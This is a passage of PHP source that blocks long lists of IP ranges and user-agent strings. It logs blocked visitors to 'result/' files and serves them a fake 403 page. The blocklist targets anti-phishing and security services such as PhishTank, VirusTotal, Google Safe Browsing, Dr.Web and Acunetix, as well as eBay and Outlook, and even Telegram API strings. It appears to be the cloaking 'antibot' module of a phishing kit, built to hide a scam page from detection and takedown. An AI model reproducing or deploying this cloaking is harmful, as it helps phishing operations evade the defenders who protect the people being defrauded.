"^66.205.64.*",
"^204.14.48.*",
"^64.27.2.*",
"^67.15.*.*",
"^202.108.252.*",
"^193.47.80.*",
"^64.62.136.*",
"^66.221.*.*",
"^64.62.175.*",
"^198.54.*.*",
"^192.115.134.*",
"^216.252.167.*",
"^193.253.199.*",
"^69.61.12.*",
"^64.37.103.*",
"^38.144.36.*",
"^64.124.14.*",
"^206.28.72.*",
"^209.73.228.*",
"^158.108.*.*",
"^168.188.*.*",
"^66.207.120.*",
"^167.24.*.*",
"^192.118.48.*",
"^67.209.128.*",
"^12.148.209.*",
"^12.148.196.*",
"^193.220.178.*",
"^68.65.53.71",
"^64.235.153.*","^64.235.154.*",
"^198.25.*.*",
"^64.106.213.*",
"54.228.218.117",
"^54.228.218.*",
"185.28.20.243",
"^185.28.20.*",
"217.16.26.166",
"162.224.156.32",
"^204.101.161.159",
"^217.16.26.*",
"^216.162.209.*",
"^64.71.193.*",
"^185.75.141.32",
"^209.66.70.*",
"^207.70.60.*",
"^209.19.185.*",
"^209.*",
"^104.236.153.*",
"^107.170.*.*",
"^109.186.*.*",
"^12.148.196.*",
"^12.148.209.*",
"^128.242.*.*",
"^131.212.*.*",
"^149.20.*.*",
"^158.108.*.*",
"^163.195.178.*",
"^167.24.*.*",
"^168.188.*.*",
"^173.194.*.*",
"^173.224.160.*",
"^173.224.161.*",
"^173.224.162.*",
"^173.224.163.*",
"^173.224.164.*",
"^173.224.165.*",
"^173.224.166.*",
"^173.224.167.*",
"^184.173.*.*",
"^192.115.134.*",
"^192.118.48.*",
"^193.220.178.*",
"^193.253.199.*",
"^193.47.80.*",
"^194.52.68.*",
"^194.72.238.*",
"^194.90.*.*",
"^198.25.*.*",
"^198.54.*.*",
"^199.30.228.*",
"^202.108.252.*",
"^204.14.48.*",
"^206.28.72.*",
"^207.126.144.*",
"^208.65.144.*",
"^208.91.115.*",
"^209.73.228.*",
"^209.85.*.*",
"^209.85.128.*",
"^212.143.*.*",
"^212.150.*.*",
"^212.235.*.*",
"^212.29.192.*",
"^212.29.224.*",
"^212.50.193.*",
"^216.10.193.*",
"^216.239.32.*",
"^216.252.167.*",
"^217.132.*.*",
"^217.132.*.*",
"^38.100.*.*",
"^38.100.*.*",
"^38.105.*.*",
"^38.144.36.*",
"^46.116.*.* ",
"^50.7.*.*",
"^50.97.*.*",
"^54.176.*.*",
"^62.116.207.*",
"^62.90.*.*",
"^64.106.213.*",
"^64.124.14.*",
"^64.18.*.*",
"^64.233.160.*",
"^64.27.2.*",
"^64.37.103.*",
"^64.62.136.*",
"^64.62.175.*",
"^66.102.*.*",
"^66.102.*.*",
"^66.135.200.*",
"^66.150.14.*",
"^66.205.64.*",
"^66.207.120.*",
"^66.221.*.*",
"^66.249.*.*",
"^67.15.*.*",
"^67.209.128.*",
"^68.65.53.71",
"^69.61.12.*",
"^69.65.*.*",
"^72.14.192.*",
"^72.14.192.*",
"^74.125.*.*",
"^74.125.*.*",
"^74.125.*.*",
"^81.161.59.*",
"^82.166.*.*",
"^85.250.*.*",
"^85.64.*.*",
"^89.138.*.*",
"^89.138.*.*",
"^91.103.66.*",
"^93.172.*.*",
"^95.76.156.*",
"^64.71.*.*",
"^203.188.221.*",
"^209.19.186.231",
"^206.207.80.*",
"^209.19.*.*",
"^206.80.*.*",
"^207.80.*.*",
"^207.70.60.*",
"^108.210.106.*",
"^173.14.18.*",
"^52.90.*.*",
"^35.172.115.*",
"^54.164.*.*",
"^222.154.252.*",
"^195.211.23.*",
"^13.57.36.*",
"^210.55.200.*",
"^42.112.8.*"
);
if($setting['block_iprange'] == "1"){
    foreach($ips as $ip) {
        if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){
            $ip = getenv("REMOTE_ADDR");
            $file = fopen("block_bot.txt","a");
            fwrite($file," BLOCKED BY IP || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
             $click = fopen("result/total_bot.txt","a");
            fwrite($click,"$ip (Detect by IP Range)"."\n");
            fclose($click);
            header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
            
        }
    }
}
     
$dp =  strtolower($_SERVER['HTTP_USER_AGENT']);
$blocked_words = array(
     "bot",
     "above",
     "google",
     "docomo",
     "mediapartners",
     "phantomjs",
     "lighthouse",
     "reverseshorturl",
     "samsung-sgh-e250",
     "softlayer",
     "amazonaws",
     "cyveillance",
     "crawler",
     "gsa-crawler",
     "phishtank",
     "dreamhost",
     "netpilot",
     "calyxinstitute",
     "tor-exit",
     "apache-httpclient",
     "lssrocketcrawler",
     "crawler",
     "urlredirectresolver",
     "jetbrains",
     "spam",
     "windows 95",
     "windows 98",
     "acunetix",
     "netsparker",
     "007ac9",
     "008",
     "Feedfetcher",
     "192.comagent",
     "200pleasebot",
     "360spider",
     "4seohuntbot",
     "50.nu",
     "a6-indexer",
     "admantx",
     "amznkassocbot",
     "aboundexbot",
     "aboutusbot",
     "abrave spider",
     "accelobot",
     "acoonbot",
     "addthis.com",
     "adsbot-google",
     "ahrefsbot",
     "alexabot",
     "amagit.com",
     "analytics",
     "antbot",
     "apercite",
     "aportworm",
     "EBAY",
     "CL0NA",
     "jabber",
     "ebay",
     "arabot",
     "hotmail!",
     "msn!",
     "baidu",
     "outlook!",
     "outlook",
     "msn",
     "duckduckbot",
     "hotmail",
     "go-http-client",
     "go-http-client/1.1",
     "trident",
     "presto",
     "virustotal",
     "unchaos",
     "dreampassport",
     "sygol",
     "nutch",
     "privoxy",
     "zipcommander",
     "neofonie",
     "abacho",
     "acoi",
     "acoon",
     "adaxas",
     "agada",
     "aladin",
     "alkaline",
     "amibot",
     "anonymizer",
     "aplix",
     "aspseek",
     "avant",
     "baboom",
     "anzwers",
     "anzwerscrawl",
     "crawlconvera",
     "del.icio.us",
     "camehttps",
     "annotate",
     "wapproxy",
     "translate",
     "feedfetcher",
     "ask24",
     "asked",
     "askaboutoil",
     "fangcrawl",
     "amzn_assoc",
     "bingpreview",
     "dr.web",
     "drweb",
     "bilbo",
     "blackwidow",
     "sogou",
     "sogou-test-spider",
     "exabot",
     "externalhit",
     "ia_archiver",
     "googletranslate",
     "translate",
     "proxy",
     "dalvik",
     "quicklook",
     "seamonkey",
     "sylera",
     "safebrowsing",
     "safesurfingwidget",
     "preview",
     "whatsapp",
     "telegram",
     "instagram",
     "zteopen",
	 "SendMessage?chat_id=",
     "icoreservice",
	 "CoralWebPrx/0.1.1x (See http://coralcdn.org/)",
"BravoBrian bstop.bravobrian.it",
"BrightCrawler (http://www.brightcloud.com/brightcrawler.asp)",
"BStop.BravoBrian.it Agent Detector",
"EmeraldShield.com WebBot (http://www.emeraldshield.com/webbot.aspx)",
"EmeraldShield.com WebBot",
"(Privoxy/1.0)",
"Ad Muncher v4.xx.x",
"Ad Muncher v4x Build xxxxx",
"Anonymized by ProxyOS: http://www.megaproxy.com",
"CE-Preload",
"CJB.NET Proxy",
"DeleGate/9.0.5-fix1",
"DoCoMo/1.0/P502i/c10 (Google CHTML Proxy/1.0)",
"DoCoMo/2.0 SH901iS(c100;TB;W24H12),gzip(gfe) (via translate.google.com)",
"Dual Proxy",
"FairAd Client",
"FANGCrawl/0.01",
"Finjan-prefetch",
"BeamMachine/0.5 (dead link remover of www.beammachine.net)",
"CoBITSProbe",
"Expired Domain Sleuth",
"Filangy/0.01-beta (Filangy; http://www.nutch.org/docs/en/bot.html; filangy-agent@filangy.com)",
"Filangy/1.0x (Filangy; http://www.filangy.com/filangyinfo.jsp?inc=robots.jsp; filangy-agent@filangy.com)",
"Filangy/1.0x (Filangy; http://www.nutch.org/docs/en/bot.html; filangy-agent@filangy.com)",
"fileboost.net/1.0 (+http://www.fileboost.net)",
"FindAnISP.com_ISP_Finder_v99a",
"collage.cgi/1.xx",
"DTAAgent",
"*/Nutch-0.9-dev",
":robot/1.0 (linux) ( admin e-mail: undefined http://www.neofonie.de/loesungen/search/robot.html )",
"+SitiDi.net/SitiDiBot/1.0 (+Have Good Day)",
"<a href='http://www.unchaos.com/'> UnChaos </a> From Chaos To Order Hybrid Web Search Engine.(vadim_gonchar@unchaos.com)",
"<a href='http://www.unchaos.com/'> UnChaos Bot Hybrid Web Search Engine. </a> (vadim_gonchar@unchaos.com)",
"<b> UnChaosBot From Chaos To Order UnChaos Hybrid Web Search Engine at www.unchaos.com </b> (info@unchaos.com)",
"<http://www.sygol.com/> http://www.sygol.com",
"192.comAgent",
"4anything.com LinkChecker v2.0",
"A1 Sitemap Generator/1.0 (+http://www.micro-sys.dk/products/sitemap-generator/) miggibot/2006.01.24",
"aardvark-crawler",
"AbachoBOT (Mozilla compatible)",
"AbachoBOT",
"ABCdatos BotLink/5.xx.xxx#BBL",
"Aberja Checkomat",
"abot/0.1 (abot; http://www.abot.com; abot@abot.com)",
"About/0.1libwww-perl/5.47",
"Accelatech RSSCrawler/0.4",
"accoona",
"Accoona-AI-Agent/1.1.1 (crawler at accoona dot com)",
"Accoona-AI-Agent/1.1.2 (aicrawler at accoonabot dot com)",
"Ack (http://www.ackerm.com/)",
"AcoiRobot",
"Acoon Robot v1.50.001",
"Acoon Robot v1.52 (http://www.acoon.de)",
"Acoon-Robot 4.0.x.[xx] (http://www.acoon.de)",
"Acoon-Robot v3.xx (http://www.acoon.de and http://www.acoon.com)",
"Acorn/Nutch-0.9 (Non-Profit Search Engine; acorn.isara.org; acorn at isara dot org)",
"AESOP_com_SpiderMan",
"agadine/1.x.x (+http://www.agada.de)",
"AgentName/0.1 libwww-perl/5.48",
"Agent-SharewarePlazaFileCheckBot/2.0+(+http://www.SharewarePlaza.com)",
"AIBOT/2.1 By +(www.21seek.com A Real artificial intelligence search engine China)",
"aipbot/1.0 (aipbot; http://www.aipbot.com; aipbot@aipbot.com)",
"aipbot/2-beta (aipbot dev; http://aipbot.com; aipbot@aipbot.com)",
"Aladin/3.324",
"Aleksika Spider/1.0 (+http://www.aleksika.com/)",
"AlkalineBOT/1.3",
"AlkalineBOT/1.4 (1.4.0326.0 RTM)",
"Allesklar/0.1 libwww-perl/5.46",
"Allrati/1.1 (+)",
"AltaVista Intranet V2.0 AVS EVAL search@freeit.com",
"AltaVista Intranet V2.0 Compaq Altavista Eval sveand@altavista.net",
"AltaVista Intranet V2.0 evreka.com crawler@evreka.com",
"AltaVista V2.0B crawler@evreka.com",
"AmfibiBOT",
"Amfibibot/0.06 (Amfibi Web Search; http://www.amfibi.com; agent@amfibi.com)",
"Amfibibot/0.07 (Amfibi Robot; http://www.amfibi.com; agent@amfibi.com)",
"amibot",
"AnnoMille spider 0.1 alpha - http://www.annomille.it",
"AnswerBus (http://www.answerbus.com/)",
"antibot-V1.1.5/i586-linux-2.2",
"AnzwersCrawl/2.0 (anzwerscrawl@anzwers.com.au;Engine)",
"A-Online Search",
"Apexoo Spider 1.x",
"Aport",
"appie 1.1 (www.walhello.com)",
"ArabyBot (compatible; Mozilla/5.0; GoogleBot; FAST Crawler 6.4; http://www.araby.com;)",
"ArachBot",
"Arachnoidea (arachnoidea@euroseek.com)",
"ArchitextSpider",
"archive.org_bot",
"Arikus_Spider",
"Arquivo-web-crawler (compatible; heritrix/1.12.1 +http://arquivo-web.fccn.pt)",
"ASAHA Search Engine Turkey V.001 (http://www.asaha.com/)",
"Asahina-Antenna/1.x (libhina.pl/x.x ; libtime.pl/x.x)",
"Asahina-Antenna/1.x",
"ask.24x.info",
"AskAboutOil/0.06-rcp (Nutch; http://www.nutch.org/docs/en/bot.html; nutch-agent@askaboutoil.com)",
"asked/Nutch-0.8 (web crawler; http://asked.jp; epicurus at gmail dot com)",
"ASPSeek/1.2.5",
"ASPseek/1.2.9d",
"ASPSeek/1.2.x",
"ASPSeek/1.2.xa",
"ASPseek/1.2.xx",
"ASPSeek/1.2.xxpre",
"ASSORT/0.10",
"asterias/2.0",
"AtlocalBot/1.1 +(http://www.atlocal.com/local-web-site-owner.html)",
"Atomz/1.0",
"Attentio/Nutch-0.9-dev (Attentio's beta blog crawler; www.attentio.com; info@attentio.com)",
"augurfind",
"augurnfind V-1.x",
"autowebdir 1.1 (www.autowebdir.com)",
"AV Fetch 1.0",
"AVSearch-1.0(peter.turney@nrc.ca)",
"AVSearch-3.0(AltaVista/AVC)",
"axadine/ (Axadine Crawler; http://www.axada.de/; )",
"AxmoRobot - Crawling your site for better indexing on www.axmo.com search engine.",
"BabalooSpider/1.3 (BabalooSpider; http://www.babaloo.si; spider@babaloo.si)",
"BaboomBot/1.x.x (+http://www.baboom.us)",
"BaiduImagespider+(+http://www.baidu.jp/search/s308.html)",
"BaiDuSpider",
"Baiduspider+(+http://help.baidu.jp/system/05.html)",
"Baiduspider+(+http://www.baidu.com/search/spider.htm)",
"Baiduspider+(+http://www.baidu.com/search/spider_jp.html)",
"Balihoo/Nutch-1.0-dev (Crawler for Balihoo.com search engine - obeys robots.txt and robots meta tags ; http://balihoo.com/index.aspx; robot at balihoo dot com)",
"BarraHomeCrawler (albertof@barrahome.org)",
"bdcindexer_2.6.2 (research@bdc)",
"BDFetch",
"BDNcentral Crawler v2.3 [en] (http://www.bdncentral.com/robot.html) (X11; I; Linux 2.0.44 i686)",
"beautybot/1.0 (+http://www.uchoose.de/crawler/beautybot/)",
"BebopBot/2.5.1 ( crawler http://www.apassion4jazz.net/bebopbot.html )",
"BigCliqueBOT/1.03-dev (bigclicbot; http://www.bigclique.com; bot@bigclique.com)",
"BIGLOTRON (Beta 2;GNU/Linux)",
"Bigsearch.ca/Nutch-x.x-dev (Bigsearch.ca Internet Spider; http://www.bigsearch.ca/; info@enhancededge.com)",
"BilgiBetaBot/0.8-dev (bilgi.com (Beta) ; http://lucene.apache.org/nutch/bot.html; nutch-agent@lucene.apache.org)",
"BilgiBot/1.0(beta) (http://www.bilgi.com/; bilgi at bilgi dot com)",
"Bitacle bot/1.1",
"Bitacle Robot (V:1.0;) (http://www.bitacle.com)",
"BlackWidow",
"Blaiz-Bee/1.0 (+http://www.blaiz.net)",
"Blaiz-Bee/2.00.8222 (BE Internet Search Engine http://www.rawgrunt.com)",
"Blaiz-Bee/2.00.xxxx (+http://www.blaiz.net)",
"BlitzBOT@tricus.net (Mozilla compatible)",
"BlitzBOT@tricus.net",
"BlogBot/1.x",
"Bloglines Title Fetch/1.0 (http://www.bloglines.com)",
"Bloglines/3.1 (http://www.bloglines.com)",
"Bloglines-Images/0.1 (http://www.bloglines.com)",
"Blogpulse (info@blogpulse.com)",
"BlogPulseLive (support@blogpulse.com)",
"BlogSearch/1.x +http://www.icerocket.com/",
"blogsearchbot-pumpkin-3",
"BlogsNowBot, V 2.01 (+http://www.blogsnow.com/)",
"BlogVibeBot-v1.1 (spider@blogvibe.nl)",
"blogWatcher_Spider/0.1 (http://www.lr.pi.titech.ac.jp/blogWatcher/)",
"BlogzIce/1.0 (+http://icerocket.com; rhodes@icerocket.com)",
"BlogzIce/1.0 +http://www.icerocket.com/",
"BloobyBot",
"Bloodhound/Nutch-0.9 (Testing Crawler for Research - obeys robots.txt and robots meta tags ; http://balihoo.com/index.aspx; robot at balihoo dot com)",
"boitho.com-dc/0.xx (http://www.boitho.com/dcbot.html)",
"boitho.com-robot/1.x (http://www.boitho.com/bot.html)",
"boitho.com-robot/1.x",
"BPImageWalker/2.0 (www.bdbrandprotect.com)",
"BravoBrian SpiderEngine MarcoPolo",
"BruinBot (+http://webarchive.cs.ucla.edu/bruinbot.html) ",
"BSDSeek/1.0",
"BTbot/0.x (+http://www.btbot.com/btbot.html)",
"BuildCMS crawler (http://www.buildcms.com/crawler)",
"BullsEye",
"bumblebee@relevare.com",
"BurstFindCrawler/1.1 (crawler.burstfind.com; http://crawler.burstfind.com; crawler@burstfind.com)",
"Buscaplus Robi/1.0 (http://www.buscaplus.com/robi/)",
"Cabot/Nutch-0.9 (Amfibi's web-crawling robot; http://www.amfibi.com/cabot/; agent@amfibi.com)",
"Cabot/Nutch-1.0-dev (Amfibi's web-crawling robot; http://www.amfibi.com/cabot/; agent@amfibi.com)",
"carleson/1.0",
"Carnegie_Mellon_University_Research_WebBOT-->PLEASE READ-->http://www.andrew.cmu.edu/~brgordon/webbot/index.html http://www.andrew.cmu.edu/~brgordon/webbot/index.html",
"Carnegie_Mellon_University_WebCrawler http://www.andrew.cmu.edu/~brgordon/webbot/index.html",
"Catall Spider",
"CazoodleBot/CazoodleBot-0.1 (CazoodleBot Crawler; http://www.cazoodle.com/cazoodlebot; cazoodlebot@cazoodle.com)",
"CCBot/1.0 (+http://www.commoncrawl.org/bot.html)",
"ccubee/x.x",
"Ceramic Tile Installation Guide (http://www.floorstransformed.com)",
"cfetch/1.0",
"ChristCRAWLER 2.0",
"CipinetBot (http://www.cipinet.com/bot.html)",
"ClariaBot/1.0",
"Claymont.com",
"CloakDetect/0.9 (+http://fulltext.seznam.cz/)",
"Clushbot/2.x (+http://www.clush.com/bot.html)",
"Clushbot/3.x-BinaryFury (+http://www.clush.com/bot.html)",
"Clushbot/3.xx-Ajax (+http://www.clush.com/bot.html)",
"Clushbot/3.xx-Hector (+http://www.clush.com/bot.html)",
"Clushbot/3.xx-Peleus (+http://www.clush.com/bot.html)",
"Cogentbot/1.X (+http://www.cogentsoftwaresolutions.com/bot.html)",
"combine/0.0",
"Combine/2.0 http://combine.it.lth.se/",
"Combine/3 http://combine.it.lth.se/",
"Combine/x.0",
"cometrics-bot, http://www.cometrics.de",
"Computer_and_Automation_Research_Institute_Crawler crawler@ilab.sztaki.hu",
"Comrite/0.7.1 (Nutch; http://lucene.apache.org/nutch/bot.html; nutch-agent@lucene.apache.org)",
"Convera Internet Spider V6.x",
"ConveraCrawler/0.2",
"ConveraCrawler/0.9d (+http://www.authoritativeweb.com/crawl)",
"ConveraMultiMediaCrawler/0.1 (+http://www.authoritativeweb.com/crawl)",
"CoolBot",
"cosmos/0.8_(robot@xyleme.com)",
"cosmos/0.9_(robot@xyleme.com)",
"CougarSearch/0.x (+http://www.cougarsearch.com/faq.shtml)",
"Covac TexAs Arachbot",
"Cowbot-0.1 (NHN Corp. / +82-2-3011-1954 / nhnbot@naver.com)",
"Cowbot-0.1.x (NHN Corp. / +82-2-3011-1954 / nhnbot@naver.com)",
"CrawlConvera0.1 (CrawlConvera@yahoo.com)",
"Crawler (cometsearch@cometsystems.com)",
"Crawler admin@crawler.de",
"Crawler V 0.2.x admin@crawler.de",
"crawler@alexa.com",
"CrawlerBoy Pinpoint.com",
"Crawllybot/0.1 (Crawllybot; +http://www.crawlly.com; crawler@crawlly.com)",
"CreativeCommons/0.06-dev (Nutch; http://www.nutch.org/docs/en/bot.html; nutch-agent@lists.sourceforge.net)",
"CrocCrawler vx.3 [en] (http://www.croccrawler.com) (X11; I; Linux 2.0.44 i686)",
"csci_b659/0.13",
"Cuasarbot/0.9b http://www.cuasar.com/spider_beta/ ",
"CurryGuide SiteScan 1.1",
"Custom Spider www.bisnisseek.com /1.0",
"CyberPatrol SiteCat Webbot (http://www.cyberpatrol.com/cyberpatrolcrawler.asp)",
"CydralSpider/1.x (Cydral Web Image Search; http://www.cydral.com)",
"CydralSpider/3.0 (Cydral Image Search; http://www.cydral.com)",
"DataFountains/Dmoz Downloader (http://ivia.ucr.edu/useragents.shtml)",
"DataFountains/DMOZ Downloader",
"DataFountains/DMOZ Feature Vector Corpus Creator (http://ivia.ucr.edu/useragents.shtml)",
"DataparkSearch/4.47 (+http://dataparksearch.org/bot)",
"DataparkSearch/4.xx (http://www.dataparksearch.org/)",
"DataSpear/1.0 (Spider; http://www.dataspear.com/spider.html; spider@dataspear.com)",
"DataSpearSpiderBot/0.2 (DataSpear Spider Bot; http://dssb.dataspear.com/bot.html; dssb@dataspear.com)",
"DatenBot( http://www.sicher-durchs-netz.de/bot.html)",
"DaviesBot/1.7 (www.wholeweb.net)",
"daypopbot/0.x",
"dbDig(http://www.prairielandconsulting.com)",
"dCSbot/1.1",
"de.searchengine.comBot 1.2 (http://de.searchengine.com/spider)",
"deepak-USC/ISI",
"DeepIndex ( http://www.zetbot.com )",
"DeepIndex (www.en.deepindex.com)",
"DeepIndex",
"DeepIndexer.ca",
"Denmex websearch (http://search.denmex.com)",
"dev-spider2.searchpsider.com/1.3b",
"DiaGem/1.1 (http://www.skyrocket.gr.jp/diagem.html)",
"Diamond/x.0",
"DiamondBot",
"-DIE-KRAEHE- META-SEARCH-ENGINE/1.1 http://www.die-kraehe.de",
"Digger/1.0 JDK/1.3.0rc3",
"DigOut4U",
"DIIbot/1.2",
"disco/Nutch-0.9 (experimental crawler; www.discoveryengine.com; disco-crawl@discoveryengine.com)",
"disco/Nutch-1.0-dev (experimental crawler; www.discoveryengine.com; disco-crawl@discoveryengine.com)",
"DittoSpyder",
"dloader(NaverRobot)/1.0",
"DoCoMo/1.0/Nxxxi/c10",
"DoCoMo/1.0/Nxxxi/c10/TB",
"DoCoMo/2.0 P900iV(c100;TB;W24H11) ",
"DoCoMo/2.0 SH902i (compatible; Y!J-SRD/1.0; http://help.yahoo.co.jp/help/jp/search/indexing/indexing-27.html)",
"DoCoMo/2.0/SO502i (compatible; Y!J-SRD/1.0; http://help.yahoo.co.jp/help/jp/search/indexing/indexing-27.html)",
"dodgebot/experimental",
"Download-Tipp Linkcheck (http://download-tipp.de/)",
"Drecombot/1.0 (http://career.drecom.jp/bot.html)",
"dtSearchSpider",
"DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
"Dumbot(version 0.1 beta - dumbfind.com)",
"Dumbot(version 0.1 beta - http://www.dumbfind.com/dumbot.html)",
"Dumbot(version 0.1 beta)",
"eApolloBot/2.0 (compatible; heritrix/2.0.0-SNAPSHOT-20071024.170148 +http://www.eapollo-opto.com)",
"EARTHCOM.info/1.x [www.earthcom.info]",
"EARTHCOM.info/1.xbeta [www.earthcom.info]",
"EasyDL/3.xx http://keywen.com/Encyclopedia/Bot",
"EasyDL/3.xx",
"EchO!/2.0",
"egothor/3.0a (+http://www.xdefine.org/robot.html)",
"EgotoBot/4.8 (+http://www.egoto.com/about.htm)",
"ejupiter.com",
"elfbot/1.0 (+http://www.uchoose.de/crawler/elfbot/)",
"ELI/20070402:2.0 (DAUM RSS Robot, Daum Communications Corp.; +http://ws.daum.net/aboutkr.html)",
"EMPAS_ROBOT",
"EnaBot/1.x (http://www.enaball.com/crawler.html)",
"Enfish Tracker",
"Enterprise_Search/1.0",
"Enterprise_Search/1.0.xxx",
"Enterprise_Search/1.00.xxx;MSSQL (http://www.innerprise.net/es-spider.asp)",
"envolk/1.7 (+http://www.envolk.com/envolkspiderinfo.php)",
"envolk[ITS]spider/1.6(+http://www.envolk.com/envolkspider.html)",
"EroCrawler",
"ES.NET_Crawler/2.0 (http://search.innerprise.net/)",
"eseek-larbin_2.6.2 (crawler@exactseek.com)",
"e-sense 1.0 ea(www.vigiltech.com/esensedisclaim.html)",
"ESISmartSpider",
"e-SocietyRobot(http://www.yama.info.waseda.ac.jp/~yamana/es/)",
"eStyleSearch 4 (compatible; MSIE 6.0; Windows NT 5.0)",
"EuripBot/0.x (+http://www.eurip.com) GetFile",
"EuripBot/0.x (+http://www.eurip.com) GetRobots",
"EuripBot/0.x (+http://www.eurip.com) PreCheck",
"Eurobot/1.0 (http://www.ayell.eu)",
"EvaalSE - bot@evaal.com",
"eventax/1.3 (eventax; http://www.eventax.de/; info@eventax.de)",
"Everest-Vulcan Inc./0.1 (R&D project; host=e-1-24; http://everest.vulcan.com/crawlerhelp)",
"Everest-Vulcan Inc./0.1 (R&D project; http://everest.vulcan.com/crawlerhelp)",
"Exabot/2.0",
"Exabot/3.0",
"Exabot-Images/1.0",
"Exabot-Test/1.0",
"ExactSeek Crawler/0.1",
"exactseek.com",
"exactseek-crawler-2.63 (crawler@exactseek.com)",
"exactseek-pagereaper-2.63 (crawler@exactseek.com)",
"Exalead NG/MimeLive Client (convert/http/0.120)",
"Excalibur Internet Spider V6.5.4",
"Execrawl/1.0 (Execrawl; http://www.execrawl.com/; bot@execrawl.com)",
"exooba crawler/exooba crawler (crawler for exooba.com; http://www.exooba.com/; info at exooba dot com)",
"exooba/exooba crawler (exooba; exooba)",
"ExperimentalHenrytheMiragoRobot",
"EyeCatcher (Download-tipp.de)/1.0",
"factbot : http://www.factbites.com/robots",
"Factbot 1.09 (see http://www.factbites.com/webmasters.php)",
"Fast Crawler Gold Edition",
"FAST Enterprise Crawler 6 (Experimental)",
"FAST Enterprise Crawler 6 / Scirus scirus-crawler@fast.no; http://www.scirus.com/srsapp/contactus/",
"FAST Enterprise Crawler 6 used by Cobra Development (admin@fastsearch.com)",
"FAST Enterprise Crawler 6 used by Comperio AS (sts@comperio.no)",
"FAST Enterprise Crawler 6 used by FAST (FAST)",
"FAST Enterprise Crawler 6 used by Pages Jaunes (pvincent@pagesjaunes.fr)",
"FAST Enterprise Crawler 6 used by Sensis.com.au Web Crawler (search_comments\at\sensis\dot\com\dot\au)",
"FAST Enterprise Crawler 6 used by Singapore Press Holdings (crawler@sphsearch.sg)",
"FAST Enterprise Crawler/6 (www.fastsearch.com)",
"FAST Enterprise Crawler/6.4 (helpdesk at fast.no)",
"FAST FirstPage retriever (compatible; MSIE 5.5; Mozilla/4.0)",
"FAST MetaWeb Crawler (helpdesk at fastsearch dot com)",
"Fast PartnerSite Crawler",
"fastbot crawler beta 2.0 (+http://www.fastbot.de)",
"FastBug http://www.ay-up.com",
"FastCrawler 3.0.1 (crawler@1klik.dk)",
"FastSearch Web Crawler for Verizon SuperPages (kevin.watters@fastsearch.com)",
"FAST-WebCrawler/2.2.10 (Multimedia Search) (crawler@fast.no; http://www.fast.no/faq/faqfastwebsearch/faqfastwebcrawler.html)",
"FAST-WebCrawler/2.2.6 (crawler@fast.no; http://www.fast.no/faq/faqfastwebsearch/faqfastwebcrawler.html)",
"FAST-WebCrawler/2.2.7 (crawler@fast.no; http://www.fast.no/faq/faqfastwebsearch/faqfastwebcrawler.html)http://www.fast.no",
"FAST-WebCrawler/2.2.8 (crawler@fast.no; http://www.fast.no/faq/faqfastwebsearch/faqfastwebcrawler.html)http://www.fast.no",
"FAST-WebCrawler/3.2 test",
"FAST-WebCrawler/3.3 (crawler@fast.no; http://fast.no/support.php?c=faqs/crawler)",
"FAST-WebCrawler/3.4/Nirvana (crawler@fast.no; http://fast.no/support.php?c=faqs/crawler)",
"FAST-WebCrawler/3.4/PartnerSite (crawler@fast.no; http://fast.no/support.php?c=faqs/crawler)",
"FAST-WebCrawler/3.5 (atw-crawler at fast dot no; http://fast.no/support.php?c=faqs/crawler)",
"FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
"FAST-WebCrawler/3.6/FirstPage (crawler@fast.no; http://fast.no/support.php?c=faqs/crawler)",
"FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
"FAST-WebCrawler/3.7/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)",
"FAST-WebCrawler/3.8 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
"FAST-WebCrawler/3.8/Fresh (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
"FAST-WebCrawler/3.x Multimedia (mm dash crawler at fast dot no)",
"FAST-WebCrawler/3.x Multimedia",
"Favcollector/2.0 (info@favcollector.com http://www.favcollector.com/)",
"favo.eu crawler/0.6 (http://www.favo.eu)",
"Faxobot/1.0",
"Feed Seeker Bot (RSS Feed Seeker http://www.MyNewFavoriteThing.com/fsb.php)",
"Feed24.com",
"FeedChecker/0.01",
"Feedfetcher-Google; (+http://www.google.com/feedfetcher.html)",
"FeedHub FeedDiscovery/1.0 (http://www.feedhub.com)",
"FeedHub MetaDataFetcher/1.0 (http://www.feedhub.com)",
"Feedjit Favicon Crawler 1.0",
"Felix - Mixcat Crawler (+http://mixcat.com)",
"FFC Trap Door Spider",
"Filtrbox/1.0",
"Findexa Crawler (http://www.findexa.no/gulesider/article26548.ece)",
"findlinks/x.xxx (+http://wortschatz.uni-leipzig.de/findlinks/) ",
"FineBot",
"Firefly/1.0 (compatible; Mozilla 4.0; MSIE 5.5)",
"Firefly/1.0",
"https://api.telegram.org/",
"Firefox (kastaneta03@hotmail.com)",
"Firefox_1.0.6 (kasparek@naparek.cz)",
"FirstGov.gov Search - POC:firstgov.webmasters@gsa.gov",
"firstsbot",
"Flapbot/0.7.2 (Flaptor Crawler; http://www.flaptor.com; crawler at flaptor period com)",
"Flexum spider",
"Flexum/2.0",
"FlickBot 2.0 RPT-HTTPClient/0.3-3",
"flunky",
"FnooleBot/2.5.2 (+http://www.fnoole.com/addurl.html)",
"FocusedSampler/1.0",
"Folkd.com Spider/0.1 beta 1 (www.folkd.com)",
"Fooky.com/ScorpionBot/ScoutOut; http://www.fooky.com/scorpionbots",
"Francis/1.0 (francis@neomo.de http://www.neomo.de/)",
"FreeFind.com-SiteSearchEngine/1.0 (http://freefind.com; spiderinfo@freefind.com)",
"FreshNotes crawler< report problems to crawler-at-freshnotes-dot-com",
"FTB-Bot http://www.findthebest.co.uk/",
"FuseBulb.Com",
"FyberSpider (+http://www.fybersearch.com/fyberspider.php)",
"8484 Boston Project v 1.0",
"Atomic_Email_Hunter/4.0",
"atSpider/1.0",
"autoemailspider",
"bwh3_user_agent",
"China Local Browse 2.6",
"ContactBot/0.2",
"ContentSmartz",
"DataCha0s/2.0",
"DataCha0s/2.0",
"DBrowse 1.4b",
"DBrowse 1.4d",
"Demo Bot DOT 16b",
"Demo Bot Z 16b",
"DSurf15a 01",
"DSurf15a 71",
